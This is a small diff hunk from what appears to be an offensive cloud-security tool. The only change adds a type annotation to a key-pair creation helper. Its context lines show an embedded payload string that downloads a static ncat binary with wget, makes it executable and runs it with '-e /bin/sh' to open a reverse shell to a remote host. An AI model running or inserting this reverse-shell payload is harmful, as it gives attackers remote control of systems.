@@ -14,7 +14,7 @@ wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_6
 chmod a+x /tmp/ncat && /tmp/ncat <rhost> <rport> -e /bin/sh"""
     
     def _create_key_pair(self, key_name: str):
-        def _create(key_name: str, dry=True):
+        def _create(key_name: str, dry: bool=True):
             try:
                 if not dry:
                     self.console.print(f"Creating key pair named `{key_name}`.. ([bold purple]ATTENTION[/bold purple])")
